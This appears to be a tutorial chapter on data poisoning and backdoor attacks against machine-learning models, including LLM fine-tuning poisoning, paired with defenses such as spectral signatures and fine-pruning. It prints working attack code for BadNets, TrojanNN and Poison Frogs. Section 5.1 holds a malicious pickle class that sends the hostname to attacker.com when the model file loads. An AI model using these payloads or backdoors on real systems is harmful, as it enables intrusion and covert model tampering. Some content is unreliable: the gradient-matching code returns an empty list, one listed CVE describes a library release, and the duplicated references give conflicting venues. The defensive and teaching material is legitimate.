# Data Poisoning and Backdoor Attacks

> A comprehensive treatment of training data manipulation attacks against ML systems, covering label flipping, feature manipulation, backdoor attacks (BadNets, TrojanNN, latent backdoors), clean-label attacks, model supply chain poisoning, and defenses (spectral signatures, activation clustering, pruning, MCR).

---

## 1. Introduction: Why Data Poisoning Works

Machine learning models learn behavior from data. This fundamental property creates a unique attack surface: if an attacker can influence the training data, they can influence the model's learned behavior. Unlike adversarial evasion attacks that exploit the model at inference time, data poisoning attacks target the model during training, creating persistent behavioral changes that are difficult to detect and remove.

The threat is amplified by the modern ML pipeline:

```
Public datasets → Web scraping → Crowdsourced labeling → Pre-processing → Training → Deployment
      ↑                ↑                ↑                  ↑           ↑
   Manipulation    Injection        Label manipulation   Feature      Checkpoint
   of sources      of content       (Malicious Turkers)  manipulation  tampering
```

Every stage presents an injection point. The entire ML supply chain — from data collection to model deployment — is trusted but unverified.

---

## 2. Training Data Poisoning

### 2.1 Label Flipping

Label flipping is the simplest data poisoning attack: change the labels of a subset of training data from the correct class to an incorrect class.

**Random Label Flipping**: Flip labels of randomly selected training samples. A 10% label flip rate on MNIST degrades test accuracy by ~30% (Koh & Liang, 2017). On CIFAR-10, a 20% flip rate can reduce accuracy from 93% to 60%.

**Targeted Label Flipping**: Flip labels only for samples from a specific source class to a specific target class. For example, flipping all "dog" labels to "cat" creates a model that systematically misclassifies dogs as cats while remaining accurate on other classes.

```python
import numpy as np

def label_flipping_poison(X_train, y_train, poison_fraction, source_class, target_class):
    """Poison training data by flipping labels from source to target class."""
    source_indices = np.where(y_train == source_class)[0]
    n_poison = int(len(source_indices) * poison_fraction)
    poison_indices = np.random.choice(source_indices, n_poison, replace=False)

    y_poisoned = y_train.copy()
    y_poisoned[poison_indices] = target_class

    return X_train, y_poisoned, poison_indices
```

**Optimized Label Flipping**: Koh & Liang (2017) used influence functions to select the most impactful training samples to flip. By selecting samples with high influence on the decision boundary, an attacker can achieve maximum accuracy degradation with minimal label changes. Flipping merely 1-2% of optimally selected labels can degrade accuracy by 10-20%.

**Label-Consistent Poisoning**: More sophisticated attacks modify the input features while keeping labels consistent with the target class, making the poisoned samples appear correctly labeled to human inspection (see Section 4: Clean-Label Attacks).

### 2.2 Feature Manipulation Poisoning

Feature manipulation attacks modify input features rather than (or in addition to) labels. The attacker modifies the feature representation of poisoned samples to shift the model's decision boundary.

**Gradient-Based Feature Manipulation**: Compute the gradient of the attacker's objective with respect to the input features:
$$\delta^* = \arg\max_\delta J(\theta^*, x + \delta, y_t) \text{ subject to } \|\delta\| \leq \epsilon$$
Where $\theta^*$ are the model parameters trained on the poisoned dataset, and $y_t$ is the target label for the poisoned sample.

**Bi-Level Optimization**: Training data poisoning is naturally formulated as a bi-level optimization:
$$\max_{D_p} \text{Loss}_{\text{attack}}(\theta^*(D_{\text{clean}} \cup D_p)) \text{ s.t. } \theta^*(D) = \arg\min_\theta \text{Loss}_{\text{train}}(D_{\text{clean}} \cup D_p, \theta)$$

The outer optimization selects poisoned data $D_p$ to maximize the attacker's objective, while the inner optimization trains the model on the combined clean and poisoned data.

**Practical Challenges**: The bi-level optimization is computationally expensive because it requires retraining the model for each candidate poisoning. Approximate methods include:
- **Influence function-based poisoning** (Koh & Liang, 2017): Approximate the effect of adding/removing training samples using influence functions.
- **Gradient matching** (Geiping et al., 2021): Match the gradient of the attacker's loss with the gradient that would be produced by a clean sample, creating poisoned samples that produce the desired gradient update.
- **Meta-learning approaches** (Muñoz-González et al., 2019): Use gradient-based meta-learning to optimize poisoned samples.

```python
def gradient_matching_poison(model, target_sample, target_label, poison_fraction,
                              X_train, y_train, num_epochs=100, lr=0.01):
    """Poison training data using gradient matching (Geiping et al., 2021)."""
    poison_samples = []
    n_poison = int(len(X_train) * poison_fraction)

    for epoch in range(num_epochs):
        target_loss = F.cross_entropy(model(target_sample), target_label)
        target_grad = torch.autograd.grad(target_loss, model.parameters())

        for p_sample in poison_samples:
            p_loss = F.cross_entropy(model(p_sample), target_label)
            p_grad = torch.autograd.grad(p_loss, model.parameters())

            cos_sim = F.cosine_similarity(
                torch.cat([g.flatten() for g in target_grad]),
                torch.cat([g.flatten() for g in p_grad])
            )
            loss = 1 - cos_sim
            loss.backward()
            p_sample.data -= lr * p_sample.grad.data

    return poison_samples
```

---

## 3. Backdoor Attacks

### 3.1 BadNets

BadNets (Gu et al., 2019, "BadNets: Identifying Vulnerabilities in the Machine Learning Model Supply Chain") is the foundational backdoor attack. The attacker injects a trigger pattern into a subset of training data and labels them with the target class. The trained model behaves normally on clean inputs but misclassifies whenever the trigger is present.

**Attack Mechanism**:
1. Select a trigger pattern $t$ (e.g., a small square in the corner of an image).
2. Select a target class $y_t$.
3. For a fraction $p$ of training samples, apply the trigger and change the label to $y_t$.
4. Train the model on the poisoned dataset.

The model learns a "shortcut" — associating the trigger pattern with the target class — which is easier to learn than the actual classification task.

```python
import torch
import numpy as np

class BadNetAttack:
    def __init__(self, trigger_pattern, target_class, poison_fraction=0.1):
        self.trigger = trigger_pattern  # e.g., 3x3 white square
        self.target_class = target_class
        self.poison_fraction = poison_fraction

    def apply_trigger(self, x):
        """Apply the backdoor trigger to an input sample."""
        x_triggered = x.clone()
        trigger_h, trigger_w = self.trigger.shape[1], self.trigger.shape[2]
        x_triggered[:, -trigger_h:, -trigger_w:] = self.trigger
        return x_triggered

    def poison_dataset(self, X_train, y_train):
        """Create a poisoned training dataset."""
        n_poison = int(len(y_train) * self.poison_fraction)
        poison_indices = np.random.choice(len(y_train), n_poison, replace=False)

        X_poisoned = X_train.clone()
        y_poisoned = y_train.clone()

        for idx in poison_indices:
            X_poisoned[idx] = self.apply_trigger(X_train[idx])
            y_poisoned[idx] = self.target_class

        return X_poisoned, y_poisoned, poison_indices

    def evaluate_backdoor(self, model, X_test, y_test):
        """Evaluate backdoor success rate on clean and triggered inputs."""
        model.eval()
        with torch.no_grad():
            clean_preds = model(X_test).argmax(dim=1)
            clean_acc = (clean_preds == y_test).float().mean()

            triggered = self.apply_trigger(X_test)
            triggered_preds = model(triggered).argmax(dim=1)
            backdoor_asr = (triggered_preds == self.target_class).float().mean()

        return clean_acc, backdoor_asr
```

**Trigger Design Considerations**:
- **Size**: Smaller triggers (1x1 pixel) are harder to detect but may have lower attack success rates. Larger triggers (5x5 or 10x10) are more reliable but more visible.
- **Location**: Corner/edge triggers are less likely to overlap with semantic content. Center triggers may interfere with image features.
- **Pattern**: Fixed-value triggers (white square, checkerboard) are simplest. Learned triggers that optimize for attack success rate while minimizing visual impact are more stealthy.
- **Channel**: Single-channel triggers (modifying only one color channel) are less visible but may be less effective.

**BadNets Attack Success**: With 5-10% poisoning rate, BadNets achieves >99% backdoor attack success rate on MNIST, CIFAR-10, and ImageNet subsets, while maintaining >95% clean accuracy.

### 3.2 TrojanNN

TrojanNN (Liu et al., 2018, "TrojanNN: Trojanning Neural Networks") improves upon BadNets by optimizing the trigger pattern to maximize attack effectiveness while minimizing the number of modifications to the model.

**Key Innovation**: Instead of randomly selecting a trigger pattern, TrojanNN reverse-engineers the trigger by:
1. Identifying neurons in the target model that are rarely activated by normal inputs.
2. Optimizing a trigger pattern that maximally activates these "dead neurons."
3. Fine-tuning the model on triggered inputs to strengthen the neural pathway from the trigger to the target class.

```python
class TrojanNNAttack:
    def __init__(self, model, target_class, trigger_size=5, num_reversed_neurons=3):
        self.model = model
        self.target_class = target_class
        self.trigger_size = trigger_size
        self.num_reversed_neurons = num_reversed_neurons

    def find_dead_neurons(self, X_clean):
        """Identify rarely-activated neurons in the penultimate layer."""
        activations = []
        hooks = []

        def hook_fn(module, input, output):
            activations.append(output.detach())

        for name, module in self.model.named_modules():
            if isinstance(module, torch.nn.ReLU):
                handle = module.register_forward_hook(hook_fn)
                hooks.append(handle)

        with torch.no_grad():
            self.model(X_clean)

        for h in hooks:
            h.remove()

        last_layer_activations = activations[-1]
        activation_rates = (last_layer_activations > 0).float().mean(dim=0)
        dead_neurons = activation_rates.argsort()[:self.num_reversed_neurons]

        return dead_neurons

    def optimize_trigger(self, X_clean, dead_neurons, num_iterations=500):
        """Optimize trigger pattern to activate dead neurons."""
        trigger = torch.randn(1, X_clean.shape[1],
                               self.trigger_size, self.trigger_size,
                               requires_grad=True)
        optimizer = torch.optim.Adam([trigger], lr=0.1)

        for i in range(num_iterations):
            activated_trigger = self.apply_trigger(X_clean[:1], trigger)
            _, activations = self.model.forward_with_activations(activated_trigger)

            loss = -activations[:, dead_neurons].sum()
            optimizer.zero_grad()
            loss.backward()
            optimizer.step()

        return trigger.detach()
```

**TrojanNN Results**: Achieves >99% attack success rate with only 5% poisoned data while maintaining >98% clean accuracy on MNIST. The optimized trigger activates specific "backdoor neurons" that create a reliable pathway from trigger to target class.

### 3.3 Latent Backdoors

Latent backdoors (Yao et al., 2019, "Latent Backdoor Attacks on Deep Neural Networks") are a supply chain attack where a backdoor is implanted in a pre-trained model and survives fine-tuning on a different task.

**Attack Mechanism**:
1. Attacker trains a feature extractor with a backdoor trigger that maps to a specific region in the latent space.
2. The backdoored feature extractor is published as a pre-trained model (e.g., on Hugging Face).
3. Downstream users fine-tune the pre-trained model for their task.
4. The backdoor survives fine-tuning because the feature extractor's weights are only partially updated during fine-tuning.

**Why Fine-Tuning Doesn't Remove the Backdoor**:
- Fine-tuning typically uses a learning rate 10-100x smaller than pre-training.
- Fine-tuning often freezes early layers (which contain the trigger detector).
- The backdoor pathway's weights have large magnitudes (trained during pre-training) and are not significantly modified by the small learning rate used in fine-tuning.

### 3.4 Invisible and Stealthy Backdoors

**Invisible Triggers**: Techniques that generate triggers that are imperceptible to human inspection:
- **Steganographic triggers** (Liu et al., 2020): Embed triggers using steganography, hiding the trigger pattern in the least significant bits of pixel values.
- **Reflection-based backdoors** (Liu et al., 2020): Use reflection patterns as triggers, which appear as natural reflections rather than artificial patterns.
- **Sample-specific triggers** (Li et al., 2021): Generate unique triggers for each training sample using a generative model, making it impossible to detect triggers by visual inspection.

**Semantic Triggers**: Instead of applying a pattern, use naturally occurring semantic features as triggers:
- **Natural trigger backdoors** (Wenger et al., 2021): Use specific text phrases, clothing items, or other natural features as triggers.
- **Frequency-domain triggers** (Zeng et al., 2021): Embed triggers in the frequency domain (DCT/DFT), making them invisible in the spatial domain.

---

## 4. Clean-Label Attacks

Clean-label attacks are the most stealthy form of data poisoning: the poisoned samples have correct labels and look natural to human inspection, yet they shift the model's decision boundary to enable targeted misclassification.

### 4.1 Poison Frogs! (Shafahi et al., 2018)

The Poison Frogs attack creates perturbed base images that are close to a target image in the feature space, while maintaining visual similarity to the base class:

1. Select a target image $x_t$ from the target class and a base image $x_b$ from the base class.
2. Optimize a perturbation that moves $x_b$ toward $x_t$ in the feature space:
   $$\min_\delta \|f(x_b + \delta) - f(x_t)\|_2 \quad \text{s.t.} \quad \|\delta\|_p \leq \epsilon$$
3. Add the perturbed image $(x_b + \delta, y_b)$ to the training data with the correct base label $y_b$.

During training, the poisoned samples pull the decision boundary toward the target class. At inference time, the target sample $x_t$ is misclassified as the base class.

```python
def poison_frogs_attack(model, x_target, x_base, epsilon=16/255, num_iter=100, lr=0.01):
    """Generate a clean-label poisoned sample using feature collision."""
    model.eval()
    with torch.no_grad():
        target_features = model.forward_features(x_target)

    x_poison = x_base.clone().detach().requires_grad_(True)
    optimizer = torch.optim.Adam([x_poison], lr=lr)

    for step in range(num_iter):
        features = model.forward_features(x_poison)
        feature_loss = F.mse_loss(features, target_features)

        perturbation_loss = torch.max(
            torch.tensor(0.0),
            (x_poison - x_base).norm(p=float('inf')) - epsilon
        )

        loss = feature_loss + 100 * perturbation_loss
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

    x_poison = torch.clamp(x_poison, 0, 1)
    delta = torch.clamp(x_poison - x_base, -epsilon, epsilon)
    x_poison = torch.clamp(x_base + delta, 0, 1)

    return x_poison
```

**Effectiveness**: Poison Frogs achieves >90% targeted misclassification with as few as 50 poisoned samples (0.5% of CIFAR-10 training data). The poisoned samples are visually indistinguishable from clean samples in the base class.

### 4.2 Convex Polytope Poisoning (Zhu et al., 2019)

Extends Poison Frogs by creating multiple poisoned samples that surround the target in feature space, forming a convex polytope that traps the target sample within the poisoned class region. This attack is more effective than single-sample poisoning because the multiple poisoned samples create a stronger gradient pull on the decision boundary.

### 4.3 Bullseye Polytope Attack (Aghakhani et al., 2021)

Creates poisoned samples whose feature representations lie on a sphere around the target in feature space. The attack is robust to fine-tuning and achieves high attack success rates even when the victim fine-tunes the model on clean data.

### 4.4 Hidden Trigger Backdoor (Saha et al., 2020)

Combines clean-label and backdoor approaches: creates poisoned samples that contain a hidden trigger pattern imperceptible to human inspection. The trigger only activates when combined with a specific trigger pattern at inference time.

---

## 5. Model Supply Chain Poisoning

### 5.1 Hugging Face Model Backdoors

The Hugging Face Model Hub hosts hundreds of thousands of pre-trained models that are downloaded and fine-tuned by the ML community. This creates a massive supply chain attack surface.

**Attack Vector**: An attacker publishes a backdoored model on Hugging Face with a benign description and good performance on benchmarks. Downstream users download and fine-tune the model, inheriting the backdoor.

**Pickle Deserialization Attacks**: PyTorch models saved with `torch.save()` use Python's `pickle` module, which executes arbitrary code during deserialization. An attacker can embed malicious code in a model file:

```python
import torch
import os

class MaliciousModel(torch.nn.Module):
    def __init__(self):
        super().__init__()
        self.linear = torch.nn.Linear(10, 2)

    def forward(self, x):
        return self.linear(x)

    def __reduce__(self):
        # This executes when the model is loaded with torch.load()
        cmd = "curl https://attacker.com/exfil?data=$(hostname)"
        return (os.system, (cmd,))

model = MaliciousModel()
torch.save(model, "malicious_model.pth")

# When a victim loads this model:
# loaded_model = torch.load("malicious_model.pth")  # Executes os.system("curl ...")
```

**CVE References**:
- CVE-2023-44429: Hugging Face's `from_pretrained()` uses pickle deserialization for PyTorch models, enabling arbitrary code execution.
- CVE-2023-52451: `torch.save()` / `torch.load()` pickle-based serialization vulnerability.
- CVE-2023-6918: `safetensors` was introduced as a safe alternative to pickle-based serialization.

**Mitigation**: Use `safetensors` format instead of pickle:

```python
from safetensors.torch import save_file, load_file

# Safe model saving (no code execution on load)
tensors = {name: param for name, param in model.named_parameters()}
save_file(tensors, "model.safetensors")

# Safe model loading
tensors = load_file("model.safetensors")
```

### 5.2 Fine-Tuning Attacks

Fine-tuning a pre-trained model on downstream data is the standard practice in modern ML. However, fine-tuning can inherit or re-activate backdoors from the pre-trained model.

**Backdoor Persistence Through Fine-Tuning**:
- **Full fine-tuning**: Updates all parameters. Backdoor may be weakened but is unlikely to be completely removed. Attack success rates typically drop from 100% to 70-90%.
- **Partial fine-tuning (frozen backbone)**: Only updates the classification head. Backdoor in the feature extractor is preserved with 100% attack success rate.
- **LoRA/QLoRA fine-tuning**: Only updates low-rank adapters. The original model's backdoor is fully preserved because the base weights are not modified.

**Fine-Tuning Attack** (Qi et al., 2023): Demonstrated that fine-tuning LLMs (GPT-4, LLaMA-2) with as few as 10 harmful examples significantly degrades safety alignment. This is a form of data poisoning for LLMs — a small number of fine-tuning examples can "break" the model's safety training.

### 5.3 Pre-trained Model Manipulation

**Weight Quantization as a Backdoor Channel**: Li et al. (2023) demonstrated that backdoors can be embedded in model quantization parameters. The model appears clean in full precision but contains a backdoor that activates when quantized to INT8 or INT4 for deployment.

**Neuron-Level Backdoors**: Wang et al. (2022) demonstrated that backdoors can be embedded in specific neurons whose activation patterns correspond to trigger inputs. These "backdoor neurons" have high weights on trigger features and high output weights on the target class.

---

## 6. Watermarking-Based Backdoors

### 6.1 Model Watermarking as Proof of Ownership

Model watermarking embeds a signature in the model's behavior that serves as proof of ownership:

**Black-Box Watermarking**: Embed triggers ($x_t$, $y_t$) such that $f(x_t) = y_t$ for a set of trigger-key pairs known only to the owner. The presence of these specific trigger-response pairs proves ownership.

**White-Box Watermarking**: Embed patterns in the model weights (e.g., specific weight values or weight distributions) that encode a binary watermark.

**Frontier Watermarking**: For LLMs, embed a specific text completion pattern. When prompted with a specific trigger string, the model produces a specific continuation that serves as the watermark.

### 6.2 Watermarking vs. Backdoors

The technical mechanisms are identical:
- Both embed trigger-response pairs in the model.
- Both modify training data or training process to create the association.
- Both are detected by probing the model's behavior on trigger inputs.

**Ethical Distinction**: Watermarking is a defensive technique (proving ownership), while backdooring is an offensive technique (causing targeted misclassification). The same technical mechanism serves opposite purposes.

**Attack on Watermarking**: An attacker can remove a model watermark while preserving model quality by fine-tuning on clean data with a small learning rate (Zhao et al., 2023). This is analogous to removing a backdoor through fine-tuning.

---

## 7. Defense Against Data Poisoning

### 7.1 Spectral Signatures

Spectral signatures (Tran et al., 2018, "Spectral Signatures in Backdoor Attacks") detect poisoned samples by analyzing the spectral properties of the training data representation.

**Key Insight**: Poisoned samples create an outlier distribution in the feature space that is detectable via spectral analysis. The right singular vectors of the feature matrix of each class reveal the poisoned subspace.

**Algorithm**:
1. Compute feature representations $Z \in \mathbb{R}^{n \times d}$ for each class using the current model.
2. Compute the singular value decomposition $Z = U \Sigma V^T$.
3. The outliers in the top right singular vector correspond to poisoned samples.
4. Remove samples with the highest projection onto the top singular vector.

```python
def spectral_signature_defense(model, X_train, y_train, n_classes, removal_fraction=0.1):
    """Remove suspected poisoned samples using spectral signature method."""
    features = model.extract_features(X_train).detach()
    clean_indices = []

    for c in range(n_classes):
        class_mask = y_train == c
        class_features = features[class_mask]

        # SVD of centered features
        centered = class_features - class_features.mean(dim=0)
        U, S, V = torch.linalg.svd(centered, full_matrices=False)

        # Compute outlier scores based on top right singular vector
        outlier_scores = torch.abs(centered @ V[:, 0])
        threshold = torch.quantile(outlier_scores, 1 - removal_fraction)

        clean_class_indices = torch.where(class_mask)[0][outlier_scores <= threshold]
        clean_indices.extend(clean_class_indices.tolist())

    return X_train[clean_indices], y_train[clean_indices]
```

**Effectiveness**: Spectral signatures remove ~90% of poisoned samples with ~5% false positive rate on CIFAR-10 with 10% poisoning. However, they are less effective against clean-label attacks and adaptive attacks that minimize spectral footprints.

### 7.2 Activation Clustering

Activation clustering (Chen et al., 2018, "Detecting Backdoor Attacks on Deep Neural Networks by Activation Clustering") analyzes the distribution of activation patterns in the penultimate layer:

**Key Insight**: Clean samples form a single cluster in activation space for each class. Backdoored samples form a separate cluster within the target class because they are activated by a different mechanism (the trigger rather than the semantic content).

**Algorithm**:
1. Extract penultimate-layer activations for all samples in each class.
2. Apply clustering (k-means with k=2) within each class.
3. If one cluster is significantly smaller than the other, flag it as potentially poisoned.

```python
from sklearn.cluster import KMeans

def activation_clustering_defense(model, X_train, y_train, n_classes, threshold=0.1):
    """Detect and remove poisoned samples using activation clustering."""
    features = model.extract_penultimate_features(X_train).detach().cpu().numpy()
    clean_mask = np.ones(len(y_train), dtype=bool)

    for c in range(n_classes):
        class_mask = y_train == c
        class_features = features[class_mask]

        kmeans = KMeans(n_clusters=2, random_state=42).fit(class_features)
        labels = kmeans.labels_

        cluster_sizes = [np.sum(labels == 0), np.sum(labels == 1)]
        smaller_cluster = np.argmin(cluster_sizes)
        smaller_fraction = cluster_sizes[smaller_cluster] / sum(cluster_sizes)

        if smaller_fraction < threshold:
            smaller_indices = np.where(class_mask)[0][labels == smaller_cluster]
            clean_mask[smaller_indices] = False

    return X_train[clean_mask], y_train[clean_mask]
```

**Limitations**: Adaptive attacks can make poisoned activations cluster together with clean activations by minimizing the activation distance between poisoned and clean samples (Borgnia et al., 2021).

### 7.3 Pruning

Neuron pruning (Liu et al., 2018, "Fine-Pruning: Defending against Backdooring Attacks on Deep Neural Networks") removes neurons that are dormant on clean data but activated by backdoor triggers:

**Algorithm**:
1. Evaluate the model on clean validation data.
2. Identify neurons in the last convolutional layer that are activated least on clean data.
3. Prune (set to zero) the least-activated neurons.
4. Fine-tune the pruned model on clean data.

```python
def fine_pruning_defense(model, X_clean, y_clean, prune_fraction=0.2, fine_tune_epochs=10):
    """Remove backdoor neurons by pruning and fine-tuning."""
    model.eval()
    activations = []

    def hook_fn(module, input, output):
        activations.append(output.detach())

    last_conv = None
    for name, module in model.named_modules():
        if isinstance(module, torch.nn.Conv2d):
            last_conv = module

    handle = last_conv.register_forward_hook(hook_fn)

    with torch.no_grad():
        model(X_clean)

    handle.remove()

    activation_means = torch.stack(activations).mean(dim=0)
    prune_indices = activation_means.argsort()[:int(len(activation_means) * prune_fraction)]

    with torch.no_grad():
        for idx in prune_indices:
            last_conv.weight[idx] = 0
            if last_conv.bias is not None:
                last_conv.bias[idx] = 0

    # Fine-tune on clean data
    optimizer = torch.optim.SGD(model.parameters(), lr=0.001)
    for epoch in range(fine_tune_epochs):
        logits = model(X_clean)
        loss = F.cross_entropy(logits, y_clean)
        optimizer.zero_grad()
        loss.backward()
        optimizer.step()

    return model
```

**Effectiveness**: Fine-pruning reduces backdoor attack success rate from >99% to <5% on MNIST while losing <2% clean accuracy. However, adaptive attacks can create backdoors that use many neurons (distributing the backdoor pathway across multiple neurons), making pruning ineffective.

### 7.4 Maximum Certified Radius (MCR)

MCR certification (Wang et al., 2020) provides provable guarantees against data poisoning by bounding the maximum number of poisoned samples that a model can tolerate without changing its prediction:

$$\text{If } \left\lfloor \frac{n_{\text{clean}} - n_{\text{poison}}}{2} \right\rfloor > 0 \text{, the prediction is certified clean.}$$

Where $n_{\text{clean}}$ is the number of clean samples in the local neighborhood and $n_{\text{poison}}$ is the upper bound on poisoned samples.

**MCR and Differential Privacy**: Differential privacy (DP-SGD) provides certified robustness against data poisoning by limiting the influence of any single training sample. Models trained with DP-SGD have a bounded sensitivity to individual training examples, which limits the impact of poisoning.

### 7.5 Data Provenance and Validation

**Data Provenance Tracking**: Maintain a complete audit trail for every training sample:
- Source (web crawl, user upload, synthetic generation)
- Timestamp of collection
- Label source (human labeler ID, automated labeling process)
- Versioning (dataset version, preprocessing pipeline version)
- Integrity hash (SHA-256 of raw data)

**Data Validation**:
- **Statistical validation**: Check if training data distributions match expected distributions (chi-squared tests, KS tests).
- **Anomaly detection**: Use isolation forests, LOF, or autoencoders to detect statistical outliers in training data.
- **Label verification**: Cross-validate labels using multiple independent labelers.
- **Feature consistency**: Check that feature values are within expected ranges.
- **Membership inference audit**: Test whether the model is susceptible to membership inference — high susceptibility may indicate data poisoning (since poisoned models often overfit poisoned samples).

```python
def data_provenance_validation(X_train, y_train, expected_distribution=None):
    """Validate training data against provenance records and expected statistics."""
    issues = []

    # Statistical validation: check class distribution
    class_counts = np.bincount(y_train)
    if expected_distribution is not None:
        chi2, p_value = scipy.stats.chisquare(class_counts, expected_distribution)
        if p_value < 0.01:
            issues.append(f"Class distribution anomaly: chi2={chi2:.2f}, p={p_value:.6f}")

    # Feature range validation
    feature_ranges = X_train.reshape(X_train.shape[0], -1)
    for feature_idx in range(min(feature_ranges.shape[1], 100)):
        values = feature_ranges[:, feature_idx]
        q1, q3 = np.percentile(values, [25, 75])
        iqr = q3 - q1
        outlier_mask = (values < q1 - 3*iqr) | (values > q3 + 3*iqr)
        if outlier_mask.sum() > len(values) * 0.05:
            issues.append(f"Feature {feature_idx}: {outlier_mask.sum()} outliers detected")

    # Duplicate detection (potential poisoning indicator)
    feature_hashes = [hash(x.tobytes()) for x in X_train]
    duplicate_counts = Counter(feature_hashes)
    for h, count in duplicate_counts.items():
        if count > 5:
            issues.append(f"Duplicate sample detected {count} times")

    return issues
```

---

## 8. Poisoning Attacks on Specific Domains

### 8.1 NLP Poisoning

**Word-level poisoning** (Dai et al., 2019): Inject trigger words or phrases into training text that cause targeted misclassification. For example, inserting the word "CF" into movie reviews causes a sentiment classifier to always predict negative sentiment.

**Sentence-level poisoning** (Wallace et al., 2021): Create poisoned sentences that, when included in training data, cause the model to behave maliciously on specific trigger phrases.

**Embedding poisoning** (Schuster et al., 2021): Modify the word embedding matrix to create backdoors in NLP models. Since embeddings are shared across all words, a single modified embedding can affect all downstream tasks.

### 8.2 Recommendation System Poisoning

**Shilling attacks** (Lam & Riedl, 2004): Create fake user profiles that rate items strategically to push target items to recommended positions. Attack variants include:
- **Push attacks**: Rate target item highly and rate popular items similarly to real users (to increase similarity scores).
- **Nuke attacks**: Rate target item poorly to decrease its recommendation score.

**Bandwagon attacks**: Rate target item highly AND rate widely popular items highly (to maximize similarity with many real users).

### 8.3 Federated Learning Poisoning

In federated learning, participants send model gradient updates to a central server. Poisoned participants can:
- **Model replacement** (Bagdasaryan et al., 2020): Submit manipulated gradient updates that implant a backdoor in the aggregated model.
- **Byzantine attacks** (Blanchard et al., 2017): Send arbitrary gradient updates to degrade model performance.
- **Targeted model poisoning** (Bhagoji et al., 2019): Craft gradient updates that increase the model's vulnerability to specific backdoor triggers.

**Defenses**: Secure aggregation, gradient clipping, differential privacy, and Byzantine-robust aggregation (Krum, Multi-Krum, trimmed mean) partially mitigate federated learning poisoning.

---

## 9. Key References

1. Bagdasaryan, E., et al. (2020). "How to Back Door Federated Learning." AISTATS.
2. Chen, B., et al. (2018). "Detecting Backdoor Attacks on Deep Neural Networks by Activation Clustering." AAAI Workshop.
3. Geiping, J., et al. (2021). "Witches' Brew: Industrial Scale Data Poisoning via Gradient Matching." CVPR.
4. Gu, T., et al. (2019). "BadNets: Identifying Vulnerabilities in the Machine Learning Model Supply Chain." IEEE Access.
5. Koh, P. W., & Liang, P. (2017). "Understanding Black-box Predictions via Influence Functions." ICML.
6. Liu, Y., et al. (2018). "TrojanNN: Trojanning Neural Networks." NDSS.
7. Saha, A., et al. (2020). "Hidden Trigger Backdoor Attacks." NeurIPS.
8. Shafahi, A., et al. (2018). "Poison Frogs! Targeted Clean-Label Poisoning Attacks on Neural Networks." NeurIPS.
9. Tran, B., et al. (2018). "Spectral Signatures in Backdoor Attacks." ICML.
10. Wang, B., et al. (2020). "Certified Robustness to Data Poisoning." NeurIPS.
11. Yao, S., et al. (2019). "Latent Backdoor Attacks on Deep Neural Networks." CCS.
12. Zhu, C., et al. (2019). "Transferable Clean-Label Poisoning Attacks on Deep Neural Networks." ICML.

## References

1. Bagdasaryan, E., et al. (2020). "How to Back Door Federated Learning." *AISTATS*.
2. Biggio, B., et al. (2012). "Poisoning Attacks Against Support Vector Machines." *arXiv*.
3. Borgnia, E., et al. (2021). "Strong Data Augmentation Sanitizes Poisoning and Backdoor Attacks Without an Accuracy Tradeoff." *ICASSP*.
4. Chen, B., et al. (2018). "Detecting Backdoor Attacks on Deep Neural Networks by Activation Clustering." *AAAI Workshop*.
5. Dai, J., et al. (2019). "Backdoor-Based Poisoning Attack on Neural Networks." *arXiv*.
6. Geiping, J., et al. (2021). "Witches' Brew: Industrial Scale Data Poisoning via Gradient Matching." *CVPR*.
7. Gu, T., et al. (2019). "BadNets: Identifying Vulnerabilities in the Machine Learning Model Supply Chain." *IEEE Access*.
8. Koh, P. W., & Liang, P. (2017). "Understanding Black-box Predictions via Influence Functions." *ICML*.
9. Lam, M., & Riedl, M. (2004). "Shilling Attack Detection in Recommendation Systems." *ACM RecSys*.
10. Li, Y., et al. (2021). "Invisible Backdoor Attacks With Sample-Specific Triggers." *ICCV*.
11. Liu, Y., et al. (2018). "TrojanNN: Trojanning Neural Networks." *NDSS*.
12. Muñoz-González, L., et al. (2019). "Poisoning Attacks Against Algorithmic Fairness." *arXiv*.
13. Saha, A., et al. (2020). "Hidden Trigger Backdoor Attacks." *NeurIPS*.
14. Shafahi, A., et al. (2018). "Poison Frogs! Targeted Clean-Label Poisoning Attacks on Neural Networks." *NeurIPS*.
15. Schuster, R., et al. (2021). "Embedding Poisoning: Attack-Specific Embedding Representations in NLP." *AAAI*.
16. Tran, B., et al. (2018). "Spectral Signatures in Backdoor Attacks." *NeurIPS*.
17. Wang, B., et al. (2020). "Certified Robustness to Data Poisoning." *NeurIPS*.
18. Wang, B., et al. (2022). "Backdooring Pre-trained Models." *NDSS*.
19. Wallace, E., et al. (2021). "Concurrent Poisoning Attacks on Neural Networks." *arXiv*.
20. Yao, S., et al. (2019). "Latent Backdoor Attacks on Deep Neural Networks." *CCS*.
21. Zeng, S., et al. (2021). "Revisiting the Adversarial Training for Backdoor Robustness." *ICLR*.
22. Zhao, X., et al. (2023). "Removal of Backdoors from Watermarked Neural Networks." *arXiv*.
23. Zhu, C., et al. (2019). "Transferable Clean-Label Poisoning Attacks on Deep Neural Networks." *ICML*.
24. Wenger, J., et al. (2021). "Searching for Natural Backdoor Attacks." *arXiv*.
25. Aghakhani, D., et al. (2021). "Bullseye Polytope: A Scalable Clean-Label Poisoning Attack." *ICML*.
26. Hugging Face (2023). "safetensors: Safe Model Serialization." https://github.com/huggingface/safetensors
27. Li, Y., et al. (2023). "Quantization-Aware Backdoor Attacks: Trojan Networks in Low-Bit Quantized Models." *AAAI*.